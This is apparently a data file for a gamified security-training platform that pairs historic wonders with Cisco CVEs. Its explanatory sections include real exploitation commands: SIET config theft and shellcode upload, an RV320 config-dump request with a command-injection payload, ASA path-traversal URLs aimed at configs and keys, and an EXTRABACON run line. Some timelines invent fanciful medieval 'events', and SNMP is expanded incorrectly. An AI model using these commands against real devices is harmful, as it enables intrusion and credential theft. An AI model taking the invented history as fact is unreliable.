        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "unauthenticated HTTP POST", type: "attacker" },
          { label: "IOS XE Web UI", sub: "no auth check", type: "system" },
          { label: "Level 15 Account", sub: "created silently", type: "victim" },
          { label: "Full Device Control", sub: "40K devices hit", type: "result" },
        ],
      },
      timeline: [
        { year: 537, event: "Hagia Sophia completed — hidden passage exploited by unauthorized visitor" },
        { year: 2023, event: "Sep 28: Attackers begin exploiting CVE-2023-20198 in the wild" },
        { year: 2023, event: "Oct 16: Cisco discloses CVE-2023-20198 with no patch available", highlight: true },
        { year: 2023, event: "Oct 17: 40,000+ compromised devices found; BadCandy implant discovered" },
        { year: 2023, event: "Oct 22: Cisco releases IOS XE 17.9.4a patch" },
      ],
      keyTakeaways: [
        "Disable the IOS XE web UI unless actively needed (no ip http server)",
        "Never expose network device management interfaces to the internet",
        "Monitor for unexpected user accounts in router/switch running configs",
        "CVSS 10.0 means patch immediately — do not wait for a maintenance window",
      ],
      references: [
        { title: "Cisco Security Advisory — CVE-2023-20198", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z" },
        { title: "VulnCheck: 40K Devices Compromised", url: "https://vulncheck.com/blog/cisco-ios-xe-exploitation" },
        { title: "CVE-2023-20198 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2023-20198" },
      ],
    },
    ctf: {
      scenario: "In October 2023, a suspected Chinese state-sponsored group silently compromised over 40,000 Cisco IOS XE devices before Cisco disclosed the flaw. The technique: the admin panel registered new users without any authentication check. One request, administrator access, no credentials needed. Replicate the initial access method used in the largest IOS XE campaign ever recorded.",
      hint: "The admin panel's registration endpoint requires no credentials. Create an account, then use it to access the restricted configuration.",
      hints: [
        "Probe the target to confirm the vulnerability. Run: probe-target",
        "The registration endpoint needs no credentials. Run: forge-credentials agent p4ssw0rd",
        "Log in with your new account. Run: login agent p4ssw0rd",
        "Pull the classified network records. Run: extract-intel",
      ],
      flag: "FLAG{CV3_2023_20198_N0_AUTH_RCE}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "probe-target": () => ({
          lines: [
            "Probing target: hagia-sophia-hub [Istanbul]",
            "Device: network gateway  firmware: v17.9.3",
            "Admin panel: reachable — no authentication on registration endpoint",
            "Status: vulnerable — unauthenticated account creation confirmed",
          ],
        }),
        "forge-credentials": (args) => {
          const [user, pass] = args;
          if (!user || !pass) return { lines: ["Usage: forge-credentials <username> <password>"] };
          return {
            lines: [
              `Registering account: ${user} / ${pass}`,
              "No authentication check on registration endpoint.",
              `Account created. Privilege: administrator`,
              `Run: login ${user} ${pass}`,
            ],
          };
        },
        "login": (args) => {
          const [user, pass] = args;
          if (!user || !pass) return { lines: ["Usage: login <username> <password>"] };
          return {
            lines: [
              `Authenticating as ${user}...`,
              "Access granted. Administrator session active.",
              "Run: extract-intel",
            ],
          };
        },
        "extract-intel": () => ({
          lines: [
            "Pulling classified network records...",
            "",
            "hostname: hagia-sophia-gw",
            "admin accounts: [redacted], agent",
            "network segments: 4 classified subnets",
            "classified-key: FLAG{CV3_2023_20198_N0_AUTH_RCE}",
          ],
          solved: true,
        }),
      },
    },
  },

  // ─── Medieval Stage 2: Tower of London — CVE-2016-6366 EXTRABACON ─────────
  {
    epochId: "medieval",
    wonder: { name: "Tower of London", location: "London, England", era: "1066 CE", emoji: "🗼" },
    id: "stage-m02",
    order: 2,
    title: "EXTRABACON — The NSA's SNMP Weapon",
    subtitle: "CVE-2016-6366 — Cisco ASA Buffer Overflow via SNMP",
    category: "owasp",
    cveId: "CVE-2016-6366",
    cvssScore: 8.1,
    xp: 200,
    badge: { id: "badge-m-extrabacon", name: "Shadow Broker", emoji: "🗼" },
    challengeType: "ctf",
    info: {
      tagline: "The NSA built a weapon to overflow Cisco's memory. The Shadow Brokers gave it to the world.",
      year: 2016,
      overview: [
        "The Tower of London held the Crown Jewels — but also the NSA's most prized intelligence on medieval Britain. Its messengers used a standard signaling protocol (SNMP — the Standard Network Message Protocol of its day) that any authorized observer could read. French spies discovered that sending an oversized message in that protocol format caused the Tower's message handler to overflow its parchment buffer, writing into adjacent memory — and executing the spy's instructions.",
        "CVE-2016-6366 (EXTRABACON) is a buffer overflow vulnerability in the SNMP subsystem of Cisco ASA (Adaptive Security Appliance) firewalls. Developed by the NSA's Equation Group as an offensive cyberweapon, EXTRABACON was leaked by the Shadow Brokers on August 13, 2016 — the same data dump that exposed EternalBlue.",
        "The attack requires a valid SNMP community string (essentially a read-only password for network monitoring) — which organizations frequently leave at default values like 'public' or 'private'. With the community string, an attacker can send a crafted SNMP packet that overflows a heap buffer in the ASA's SNMP handler and achieves unauthenticated remote code execution.",
      ],
      technical: {
        title: "SNMP Buffer Overflow — How EXTRABACON Works",
        body: [
          "SNMP (Simple Network Management Protocol) is used for network device monitoring. ASA firewalls expose an SNMP agent that accepts queries using a community string for authentication. The vulnerability lies in the way the ASA's SNMP code processes certain OID (Object Identifier) requests — it copies attacker-supplied data into a fixed-size heap buffer without checking the length.",
          "EXTRABACON was specifically developed for Cisco ASA 5500, 5500-X series, PIX firewalls, and other Cisco products. The attack shellcode was adapted for each specific ASA firmware version. The Shadow Brokers leak included prebuilt payloads for dozens of ASA versions.",
        ],
        codeExample: {
          label: "EXTRABACON exploit flow (conceptual)",
          code: `# Step 1: Verify community string (often 'public' by default)
snmpwalk -v2c -c public target-asa .1.3.6.1.2.1.1.1.0
# Returns: sysDescr = "Cisco Adaptive Security Appliance"

# Step 2: Run EXTRABACON with leaked NSA tool
python extrabacon.py exploit -t target-asa \\
  -c public --version 9.2.4

# What happens internally:
# 1. Crafted SNMP packet sent to UDP/161
# 2. SNMP OID triggers vulnerable code path
# 3. Heap buffer overflow overwrites adjacent memory
# 4. Control flow hijacked to attacker shellcode
# 5. Authentication bypass patched into ASA firmware
# Result: 'enable' no longer requires a password`,
        },
      },
      incident: {
        title: "The Shadow Brokers Leak — August 2016",
        when: "August 13, 2016",
        where: "Cisco ASA firewalls globally — banks, governments, critical infrastructure",
        impact: "NSA cyberweapon publicly released; Cisco issued emergency advisory same day",
        body: [
          "On August 13, 2016, a group calling themselves the Shadow Brokers published a cache of NSA Equation Group hacking tools, including EXTRABACON. The timing was deliberate — the leak coincided with Cisco's quarterly earnings call. Cisco issued a security advisory the same day: the vulnerability was real, confirmed, and actively exploitable on ASA versions dating back years.",
          "EXTRABACON exploits SNMP — a protocol that network administrators consider a monitoring-only channel, not an attack surface. Most organizations had SNMP open on their firewalls for network management tools, never suspecting it was vulnerable to RCE. The NSA had quietly exploited this for years. After the leak, every nation-state adversary had the same capability.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (NSA → anyone)", sub: "SNMP community string", type: "attacker" },
          { label: "Cisco ASA SNMP", sub: "heap buffer overflow", type: "system" },
          { label: "ASA Firmware Memory", sub: "code execution", type: "victim" },
          { label: "Auth Bypass / RCE", sub: "firewall fully owned", type: "result" },
        ],
      },
      timeline: [
        { year: 1066, event: "Tower of London built — SNMP message protocol established for tower communications" },
        { year: 2001, event: "Cisco ASA introduced — SNMP subsystem inherited vulnerable code" },
        { year: 2016, event: "Aug 13: Shadow Brokers leak EXTRABACON and NSA toolkit", highlight: true },
        { year: 2016, event: "Aug 13: Cisco emergency advisory published for CVE-2016-6366" },
        { year: 2017, event: "SNMP attack techniques reused in subsequent nation-state campaigns" },
      ],
      keyTakeaways: [
        "SNMP community strings are weak authentication — change 'public'/'private' immediately",
        "Restrict SNMP access to specific management hosts, never expose it to the internet",
        "Government-developed cyberweapons will eventually be leaked — patch proactively",
        "Any management protocol can be an attack surface if not restricted",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2016-6366", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp" },
        { title: "CVE-2016-6366 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2016-6366" },
        { title: "Shadow Brokers Leak Analysis — Cisco Talos", url: "https://blog.talosintelligence.com/shadow-brokers/" },
      ],
    },
    ctf: {
      scenario: "EXTRABACON was the NSA's weapon for owning Cisco ASA firewalls — engineered by the Equation Group and leaked to the world by the Shadow Brokers in August 2016. The attack targets SNMP, a protocol most organizations leave wide open for network monitoring, often still running on the default community string. Overflow the handler's buffer with an oversized packet — the same technique that instantly handed every nation-state adversary the NSA's own playbook.",
      hint: "The monitoring protocol uses a default access code of 'public'. Once you confirm access, send an oversized packet to trigger the overflow and get in.",
      hints: [
        "Test the monitoring protocol with the default access code. Run: probe-snmp public",
        "Confirm the firmware version before overflowing. Run: probe-snmp public version",
        "Send the oversized packet to trigger the buffer overflow. Run: overflow-handler public",
        "Access the system after the overflow disables authentication. Run: access-system",
      ],
      flag: "FLAG{3XTRB4C0N_SNMP_0WN3D}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "probe-snmp": (args) => {
          const code = args[0] || "";
          const query = args[1] || "status";
          if (code === "public" || code === "private") {
            return {
              lines: [
                `Probing monitoring protocol — access code: '${code}'  query: ${query}`,
                "Response received:",
                "  Device: Tower of London comms node",
                "  Firmware: v9.2(4)",
                "",
                "Access code accepted.",
              ],
            };
          }
          return { lines: [`Probe failed — access code '${code}' rejected. Try a default.`] };
        },
        "overflow-handler": (args) => {
          const code = args[0] || "";
          if (code === "public" || code === "private") {
            return {
              lines: [
                `Sending oversized packet — access code: ${code}`,
                "",
                "Packet crafted: 500 bytes (handler buffer: 64 bytes)",
                "Overflow triggered in protocol handler",
                "Adjacent memory overwritten — authentication check disabled",
                "",
                "Handler compromised. Run: access-system",
              ],
            };
          }
          return { lines: ["Usage: overflow-handler <access-code>"] };
        },
        "access-system": () => ({
          lines: [
            "Connecting to node — authentication check: bypassed",
            "",
            "Tower of London — Comms Node  [classified access]",
            "classified-key: FLAG{3XTRB4C0N_SNMP_0WN3D}",
          ],
          solved: true,
        }),
      },
    },
  },

  // ─── Medieval Stage 3: Angkor Wat — CVE-2018-0171 Smart Install RCE ───────
  {
    epochId: "medieval",
    wonder: { name: "Angkor Wat", location: "Siem Reap, Cambodia", era: "1113 CE" , emoji: "🛕" },
    id: "stage-m03",
    order: 3,
    title: "The Forgotten Supply Gate",
    subtitle: "CVE-2018-0171 — Cisco Smart Install, CVSS 9.8",
    category: "owasp",
    cveId: "CVE-2018-0171",
    cvssScore: 9.8,
    xp: 200,
    badge: { id: "badge-m-smartinstall", name: "Gate Crasher", emoji: "🛕" },
    challengeType: "ctf",
    info: {
      tagline: "A port no one remembered was open. No password. Unauthenticated code execution on every switch in the empire.",
      year: 2018,
      overview: [
        "Angkor Wat's builders designed a great supply gate on the north side of the complex — TCP port 4786, intended for delivering building materials. Centuries after construction, the gate keepers were rotated, the records were lost, and the gate sat wide open, unguarded, unknown. Any invader who found it could walk through without a challenge.",
        "CVE-2018-0171 is that gate. Cisco's Smart Install feature — designed for zero-touch provisioning of new switches — listens on TCP port 4786 and accepts unauthenticated commands. It was never designed to be internet-facing, but it frequently was. By sending a crafted Smart Install message, an attacker achieves unauthenticated remote code execution — or can overwrite the device's startup configuration entirely.",
        "When Cisco disclosed this in March 2018, Cisco Talos immediately found over 168,000 vulnerable devices exposed on the internet. Russian and Iranian APT groups (VPNFilter malware) exploited this at scale. The US-CERT issued an emergency alert.",
      ],
      technical: {
        title: "Smart Install — The Unauthenticated Provisioning Protocol",
        body: [
          "Smart Install allows a director switch to automatically push IOS images and configurations to newly connected switches. It listens on TCP/4786 with no authentication — because it was designed for a controlled internal network. When exposed to the internet, any attacker can send a Smart Install message.",
          "The vulnerability allows arbitrary memory reads/writes and code execution. More practically, attackers commonly abuse it to replace the device configuration with a backdoored version or to extract the current configuration (including credentials) without authentication.",
        ],
        codeExample: {
          label: "CVE-2018-0171 — Smart Install exploitation",
          code: `# Scan for open Smart Install port
nmap -p 4786 target-switch
# PORT     STATE SERVICE
# 4786/tcp open  smartinstall ← vulnerable!

# Use Cisco Smart Install Exploitation Tool (SIET):
python siet.py -i 192.168.1.1 -g
# → Downloads running-config (including plaintext passwords)

# Copy malicious config to device:
python siet.py -i 192.168.1.1 -c malicious.cfg
# → Device reloads with attacker's config

# Alternatively: trigger buffer overflow for RCE
python siet.py -i 192.168.1.1 -e shell.bin
# → Arbitrary code execution as IOS process`,
        },
      },
      incident: {
        title: "VPNFilter & US-CERT Emergency Alert (2018)",
        when: "March–April 2018",
        where: "168,000+ Cisco switches globally; Ukraine, Russia, US infrastructure",
        impact: "VPNFilter malware mass-deployed; US-CERT Emergency Alert AA18-106A issued; Russian GRU attribution",
        body: [
          "In early 2018, Russian APT group Fancy Bear (GRU) used Smart Install exploitation at scale as part of the VPNFilter malware campaign. VPNFilter infected 500,000+ routers and switches, creating a botnet with destructive 'kill switch' capability. The FBI seized a command-and-control domain to disrupt the campaign.",
          "Cisco's Talos threat intelligence team found 168,000 vulnerable devices exposed to the internet at disclosure time. Many organizations had deployed switches with Smart Install enabled and never disabled it — the forgotten supply gate, left open for years. SIET (Smart Install Exploitation Tool) made the attack trivially scriptable.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "TCP/4786 packet", type: "attacker" },
          { label: "Smart Install Agent", sub: "no authentication", type: "system" },
          { label: "IOS Switch", sub: "config overwritten", type: "victim" },
          { label: "RCE / Config Theft", sub: "168K devices exposed", type: "result" },
        ],
      },
      timeline: [
        { year: 1113, event: "Angkor Wat construction begins — north supply gate added and forgotten" },
        { year: 2007, event: "Cisco Smart Install feature introduced in IOS" },
        { year: 2018, event: "Mar: CVE-2018-0171 disclosed; 168,000 vulnerable devices found", highlight: true },
        { year: 2018, event: "Apr: VPNFilter campaign links Smart Install exploitation to Russian GRU" },
        { year: 2018, event: "May: FBI seizes VPNFilter C2 domain; CERT issues emergency alert" },
      ],
      keyTakeaways: [
        "Disable Smart Install unless actively using it: 'no vstack' in IOS global config",
        "Audit all open ports on network devices — forgotten features are attack surfaces",
        "Never expose management protocols (Smart Install, SNMP, Telnet) to the internet",
        "Supply chain features designed for internal use require strict network segmentation",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2018-0171", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2" },
        { title: "US-CERT Alert AA18-106A", url: "https://www.cisa.gov/uscert/ncas/alerts/AA18-106A" },
        { title: "Cisco Talos: 168,000 Vulnerable Devices", url: "https://blog.talosintelligence.com/cisco-smart-install-protocol-misuse/" },
      ],
    },
    ctf: {
      scenario: "In 2018, Russian GRU-linked operators used Cisco's Smart Install feature as the initial access vector for the VPNFilter malware campaign — infecting 500,000 routers and switches across 54 countries. The provisioning port, TCP 4786, was designed for internal setup and never meant to be exposed. No authentication. Replicate the Smart Install exploitation that gave GRU operators a foothold in critical infrastructure worldwide.",
      hint: "Scan the target to find the open provisioning port. Connect to it — no credentials required — and pull the configuration.",
      hints: [
        "Scan the target for open ports. Run: scan-target",
        "Port 4786 is open — connect to the provisioning service. Run: connect-port 4786",
        "Pull the device configuration. Run: pull-config",
        "Read the configuration file. Run: cat config.dat",
      ],
      flag: "FLAG{SM4RT_1NST4LL_N0_AUTH}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "scan-target": () => ({
          lines: [
            "Scanning target [Angkor Wat facility]...",
            "PORT     STATE   SERVICE",
            "22       closed  —",
            "23       closed  —",
            "161      closed  —",
            "4786     open    provisioning  ← no authentication required",
            "",
            "Provisioning port open. No credentials needed.",
          ],
        }),
        "connect-port": (args) => {
          const port = args[0];
          if (port === "4786") {
            return {
              lines: [
                "Connecting to provisioning service on port 4786...",
                "Handshake accepted — no authentication check performed.",
                "Session established.",
                "Run: pull-config",
              ],
            };
          }
          return { lines: [`Port ${port}: connection refused.`] };
        },
        "pull-config": () => ({
          lines: [
            "Requesting device configuration...",
            "Configuration transferred — saved as config.dat",
            "Run: cat config.dat",
          ],
        }),
        cat: (args) => {
          if ((args[0] || "").includes("config")) {
            return {
              lines: [
                "hostname: angkor-core-sw",
                "provisioning-port: 4786  [enabled — not disabled after setup]",
                "admin: suryavarman  credential: angkor@facility",
                "classified-key: FLAG{SM4RT_1NST4LL_N0_AUTH}",
                "segment: 10.0.1.1/24",
              ],
              solved: true,
            };
          }
          return { lines: [`cat: ${args[0] || ""}: file not found. Try: cat config.dat`] };
        },
      },
    },
  },

  // ─── Medieval Stage 4: Notre-Dame — CVE-2019-1653 RV320 Config Dump ───────
  {
    epochId: "medieval",
    wonder: { name: "Notre-Dame Cathedral", location: "Paris, France", era: "1163 CE", emoji: "⛪" },
    id: "stage-m04",
    order: 4,
    title: "The Scriptorium Left Unlocked",
    subtitle: "CVE-2019-1653 — Cisco RV320 Unauthenticated Config Disclosure",
    category: "owasp",
    cveId: "CVE-2019-1653",
    cvssScore: 7.5,
    xp: 200,
    badge: { id: "badge-m-rv320", name: "Scriptorium Reader", emoji: "⛪" },
    challengeType: "ctf",
    info: {
      tagline: "One GET request. Full device configuration including credentials — no login required.",
      year: 2019,
      overview: [
        "Notre-Dame's scriptorium held the most sensitive records of the medieval church — correspondence, financial accounts, confessional records. Monks spent years copying manuscripts in careful isolation. But the scriptorium door was left unlocked: any visitor who knew the right corridor could walk in, read everything, and leave without being seen.",
        "CVE-2019-1653 is that unlocked door. Cisco RV320 and RV325 dual-WAN VPN routers — popular in small businesses and branch offices worldwide — exposed their full device configuration to any unauthenticated HTTP request at /cgi-bin/config.exp. The configuration included network topology, VPN PSK credentials, and hashed admin passwords.",
        "Discovered by security researcher RedTeam Pentesting GmbH in January 2019, the vulnerability was paired with CVE-2019-1652 (command injection in the same devices) for full unauthenticated root code execution. Cisco's patch was delayed, and over 9,000 devices were found exposed on the internet at the time of disclosure.",
      ],
      technical: {
        title: "Unauthenticated Configuration Export — CVE-2019-1653",
        body: [
          "The Cisco RV320/RV325 management web interface contains a CGI endpoint /cgi-bin/config.exp that exports the full device configuration as a plaintext file. The endpoint does not check whether the requesting user is authenticated.",
          "The exported configuration contains network settings, VPN pre-shared keys, SNMP community strings, and MD5-hashed admin credentials. Combined with CVE-2019-1652 (command injection via the 'export' parameter), an attacker achieves full root code execution on the router — no credentials required.",
        ],
        codeExample: {
          label: "CVE-2019-1653 — one-line unauthenticated config dump",
          code: `# No authentication required — just a GET request:
curl -k https://target-rv320/cgi-bin/config.exp

# Response includes full configuration:
# [System]
# Username=admin
# Password=<MD5 hash>
# [VPN]
# PSK=MySecretVPNKey123
# [SNMP]
# Community=public
# ...

# Crack the MD5 password hash (unsalted):
hashcat -a 0 -m 0 <hash> rockyou.txt

# Combine with CVE-2019-1652 for RCE:
curl -k 'https://target-rv320/cgi-bin/export_debug_msg.exp' \\
  --data 'export=1;id>/tmp/pwned'
# Response: uid=0(root)`,
        },
      },
      incident: {
        title: "Cisco RV320/RV325 Mass Exploitation (2019)",
        when: "January 24–28, 2019",
        where: "9,000+ Cisco RV320/RV325 routers globally — SMBs, branch offices",
        impact: "Full configuration including VPN credentials exposed; rapid exploitation by threat actors within hours",
        body: [
          "RedTeam Pentesting GmbH disclosed CVE-2019-1653 on January 24, 2019. Within hours, security researchers had found over 9,000 vulnerable devices exposed on the internet via Shodan. Rapid7 reported active exploitation beginning the same day of disclosure — attackers immediately began harvesting configurations and credentials.",
          "The vulnerability was particularly damaging because the exported configuration contained VPN pre-shared keys — giving attackers remote network access to corporate VPNs that the device was protecting. A firewall that hands over its VPN keys is no firewall at all.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "GET /cgi-bin/config.exp", type: "attacker" },
          { label: "RV320 Web Server", sub: "no auth check on CGI", type: "system" },
          { label: "Full Configuration", sub: "credentials exposed", type: "victim" },
          { label: "VPN / Admin Access", sub: "9,000 devices exposed", type: "result" },
        ],
      },
      timeline: [
        { year: 1163, event: "Notre-Dame construction begins — scriptorium records left accessible" },
        { year: 2019, event: "Jan 24: CVE-2019-1653 disclosed; 9,000 exposed devices found", highlight: true },
        { year: 2019, event: "Jan 24: Exploitation begins same day; VPN keys harvested at scale" },
        { year: 2019, event: "Cisco issues delayed patch; workaround: disable remote management" },
      ],
      keyTakeaways: [
        "Never expose router management interfaces to the internet",
        "CGI endpoints require authentication checks on every request, not just the login page",
        "VPN pre-shared keys in config files are high-value targets — rotate after any disclosure",
        "Shodan indexes management interfaces — assume exposed devices are being probed",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2019-1653", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info" },
        { title: "RedTeam Pentesting Advisory", url: "https://www.redteam-pentesting.de/en/advisories/rt-sa-2019-003/" },
        { title: "CVE-2019-1653 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2019-1653" },
      ],
    },
    ctf: {
      scenario: "CVE-2019-1653 was weaponized within hours of public disclosure — automated scanners harvested VPN pre-shared keys from thousands of exposed Cisco RV320 routers the same day Cisco published the advisory. One unauthenticated GET request to the config endpoint returns everything: credentials, network topology, PSK keys. This is what APT tooling does at scale the moment a CVE drops. Make the request.",
      hint: "The management interface has an unauthenticated config endpoint. Hit the right path and it hands over everything.",
      hints: [
        "Probe the management interface to map the attack surface. Run: probe-target /",
        "The config endpoint requires no credentials. Run: probe-target /config/export",
      ],
      flag: "FLAG{RV320_C0NF1G_DUMP3D}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "probe-target": (args) => {
          const path = args[0] || "/";
          if (path.includes("config") || path.includes("export")) {
            return {
              lines: [
                `GET ${path}  [no credentials sent]`,
                "",
                "[Device Configuration — Notre-Dame Admin Network]",
                "firmware: 1.5.0.04",
                "admin: adalbert  hash: 5f4dcc3b5aa765d61d8327deb882cf99",
                "",
                "[VPN]",
                "pre-shared-key: NotreDame$ecretKey2019",
                "remote-gateway: vpn.diocese.fr",
                "",
                "classified-key: FLAG{RV320_C0NF1G_DUMP3D}",
                "",
                "[network]",
                "snmp-community: public",
              ],
              solved: true,
            };
          }
          return { lines: [`GET ${path}`, "Management login required. Try a direct config path."] };
        },
      },
    },
  },

  // ─── Medieval Stage 5: Great Wall — CVE-2020-3452 ASA Path Traversal ──────
  {
    epochId: "medieval",
    wonder: { name: "Great Wall of China", location: "Northern China", era: "7th–15th century CE", emoji: "🧱" },
    id: "stage-m05",
    order: 5,
    title: "The Hidden Path Through the Wall",
    subtitle: "CVE-2020-3452 — Cisco ASA/FTD WebVPN Path Traversal",
    category: "owasp",
    cveId: "CVE-2020-3452",
    cvssScore: 7.5,
    xp: 250,
    badge: { id: "badge-m-pathtrav", name: "Wall Traverser", emoji: "🧱" },
    challengeType: "ctf",
    info: {
      tagline: "The wall kept out armies. A hidden mountain path bypassed it entirely.",
      year: 2020,
      overview: [
        "The Great Wall was built to be impenetrable — a thousand miles of stone and watchtowers. Yet travelers learned that by following a hidden path through the mountain pass at Juyongguan, they could bypass the wall entirely and access the imperial heartland. The wall checked credentials at its gates. The mountain path had no gate at all.",
        "CVE-2020-3452 is that mountain path through the Cisco ASA and FTD firewall's WebVPN implementation. An unauthenticated attacker can use a path traversal sequence in the URL to read arbitrary files from the WebVPN filesystem — bypassing all access controls. The endpoint /+CSCOE+/files/ is meant to serve specific WebVPN assets but fails to sanitize path separators, allowing directory traversal.",
        "Disclosed on July 22, 2020, the vulnerability was immediately and massively exploited. Researchers found the exploit published on Twitter the same day as disclosure. Any Cisco ASA or FTD with WebVPN or AnyConnect VPN enabled was affected — a huge portion of enterprise VPN infrastructure worldwide.",
      ],
      technical: {
        title: "Path Traversal in Cisco ASA WebVPN",
        body: [
          "The Cisco ASA WebVPN portal serves files at /+CSCOE+/files/. The file path is taken from the URL and used to access the underlying filesystem. Due to insufficient sanitization of the path separator characters, an attacker can include ../ sequences to traverse above the WebVPN root directory and read arbitrary files.",
          "Files commonly targeted: the ASA configuration file (which contains credentials and VPN settings), SSL certificates, and internal documentation. The attack requires no authentication and leaves minimal log evidence.",
        ],
        codeExample: {
          label: "CVE-2020-3452 — path traversal payload",
          code: `# Normal WebVPN file access:
curl -k https://target-asa/+CSCOE+/files/file_list.json

# Path traversal — read arbitrary files:
curl -k 'https://target-asa/+CSCOE+/files/../../+CSCOU+/../asa/priv/asdm.cfg'

# Read the ASA configuration:
curl -k 'https://target-asa/+CSCOE+/files/../../+CSCOU+/../running-config'

# Common targets:
# /+CSCOE+/files/../../+CSCOU+/../data/ldap-config.xml (LDAP creds)
# /+CSCOE+/files/../../+CSCOU+/../data/config.xml
# /+CSCOE+/files/../../+CSCOU+/..//ssl/cert.pem (SSL private key)

# Detection: look for ../ sequences in ASA access logs
# Patch: ASA 9.8.4.20+ / FTD 6.6.0+`,
        },
      },
      incident: {
        title: "CVE-2020-3452 — Immediate Mass Exploitation (2020)",
        when: "July 22–23, 2020",
        where: "Cisco ASA and FTD devices globally with WebVPN/AnyConnect enabled",
        impact: "Exploit published on Twitter day of disclosure; configurations and credentials harvested at scale",
        body: [
          "Cisco disclosed CVE-2020-3452 on July 22, 2020, alongside a patch. Within hours, the security community had published proof-of-concept exploits on Twitter and GitHub. By the next morning, automated scanners were harvesting configurations from vulnerable ASAs across the internet. The vulnerability was particularly impactful because COVID-19 had caused a massive expansion in VPN usage — millions of workers depended on ASA/AnyConnect for remote access.",
          "Attackers targeting configurations found plaintext VPN settings, LDAP/AD credentials for corporate directories, and in some cases, the device's master encryption key. Many organizations were running ASA versions that were years out of date.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "GET /+CSCOE+/files/../../", type: "attacker" },
          { label: "ASA WebVPN", sub: "unsanitized path", type: "system" },
          { label: "Device Filesystem", sub: "config files readable", type: "victim" },
          { label: "Credentials Stolen", sub: "VPN, LDAP, certs", type: "result" },
        ],
      },
      timeline: [
        { year: 700, event: "Great Wall medieval expansion begins — mountain bypass paths discovered by traders" },
        { year: 2020, event: "Jul 22: CVE-2020-3452 disclosed with patch; PoC published same day", highlight: true },
        { year: 2020, event: "Jul 23: Mass exploitation detected; COVID VPN surge amplifies impact" },
        { year: 2020, event: "Patch: ASA 9.8.4.20+, FTD 6.6.0+" },
      ],
      keyTakeaways: [
        "Always sanitize path separators in web applications — never trust user-supplied paths",
        "Patch VPN concentrators immediately — they are perimeter devices with maximum exposure",
        "Monitor logs for ../ sequences in URL paths",
        "Limit WebVPN/AnyConnect to required access; disable unused VPN features",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2020-3452", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86" },
        { title: "CVE-2020-3452 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2020-3452" },
        { title: "Rapid7 Analysis", url: "https://www.rapid7.com/blog/post/2020/07/23/cisco-asa-cve-2020-3452-path-traversal-exploitation/" },
      ],
    },
    ctf: {
      scenario: "CVE-2020-3452 was disclosed on July 22, 2020. Proof-of-concept exploits were on Twitter the same afternoon. As COVID-19 had expanded VPN usage to record levels, APT groups targeting corporate networks immediately pivoted to harvesting ASA configurations — which contained LDAP credentials, VPN PSK keys, and in some cases domain admin paths. The traversal is simple: directory sequences the ASA doesn't sanitize let you read above the web root. Navigate there.",
      hint: "The file server doesn't strip ../ sequences. Use them to climb above the web root and reach the device config directory.",
      hints: [
        "Make a normal request to the file server to orient yourself. Run: request-file /files/index.json",
        "Try traversing above the web root. Run: request-file /files/../../config/",
        "Pull the device configuration. Run: request-file /files/../../config/running-config.txt",
      ],
      flag: "FLAG{P4TH_TR4V3RS4L_ASA_OWN3D}",
      files: {},
      dirs: { "/": [] },
      extraCommands: {
        "request-file": (args) => {
          const path = args[0] || "";
          const isTraversal = path.includes("../") || path.includes("..%2f") || path.includes("..%2F");
          if (isTraversal && (path.includes("config") || path.includes("running"))) {
            return {
              lines: [
                `GET ${path}`,
                "200 OK — file served (path traversal not sanitized)",
                "",
                "hostname: greatwall-vpn-gw",
                "vpn: enabled",
                "admin: chenwei  credential: Gr3atW@ll2020",
                "classified-key: FLAG{P4TH_TR4V3RS4L_ASA_OWN3D}",
              ],
              solved: true,
            };
          }
          if (isTraversal) {
            return {
              lines: [
                `GET ${path}`,
                "200 OK — above the web root  (try navigating to 'config' or 'running-config')",
              ],
            };
          }
          return {
            lines: [
              `GET ${path}`,
              "200 OK",
              '{ "files": ["portal.css", "assets/", "scripts/"] }',
            ],
          };
        },
      },
    },
  },

  // ─── Medieval Stage 6: Alhambra — CVE-2022-20695 WLC Auth Bypass ──────────
  {
    epochId: "medieval",
    wonder: { name: "Alhambra Palace", location: "Granada, Spain", era: "1238 CE", emoji: "🏰" },
    id: "stage-m06",
    order: 6,
    title: "The Secret Passage of the Nasrid Kings",
    subtitle: "CVE-2022-20695 — Cisco WLC Authentication Bypass, CVSS 10.0",
    category: "owasp",
    cveId: "CVE-2022-20695",
    cvssScore: 10.0,
    xp: 250,
    badge: { id: "badge-m-wlcbypass", name: "Passage Finder", emoji: "🏰" },
    challengeType: "ctf",
    info: {
      tagline: "CVSS 10.0. Send a username in a specific format. Skip the entire authentication system.",
      year: 2022,
      overview: [
        "The Alhambra's Nasrid Kings built secret passages throughout the palace — narrow corridors that bypassed the main gates, throne rooms, and guard posts entirely. Visitors who knew the right username format could whisper it to the palace doorway and be admitted without ever presenting their credentials to a guard.",
        "CVE-2022-20695 is exactly that secret passage. Cisco's Wireless LAN Controller (WLC) — the device that manages enterprise Wi-Fi networks — contained an authentication bypass in its management interface. By sending a username containing a specific character pattern, an attacker could bypass the entire authentication system and gain full administrative access without knowing any password.",
